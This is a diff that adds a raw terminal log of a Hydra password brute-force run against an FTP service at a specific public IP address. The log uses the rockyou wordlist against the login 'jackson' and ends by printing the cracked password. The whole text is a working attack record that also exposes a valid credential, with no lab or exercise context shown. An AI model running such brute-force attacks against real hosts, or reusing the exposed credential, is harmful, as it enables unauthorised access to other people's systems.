@@ -1,0 +1,13 @@
+ hydra -l jackson -P /usr/share/wordlists/rockyou.txt.gz ftp://98.80.212.40 
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-05 14:14:31
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://98.80.212.40:21/
+[STATUS] 253.00 tries/min, 253 tries in 00:01h, 14344146 to do in 944:57h, 16 active
+[STATUS] 248.67 tries/min, 746 tries in 00:03h, 14343653 to do in 961:23h, 16 active
+[STATUS] 253.29 tries/min, 1773 tries in 00:07h, 14342626 to do in 943:47h, 16 active
+[21][ftp] host: 98.80.212.40   login: jackson   password: mystuff
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-05 14:22:13
+                                                                                          
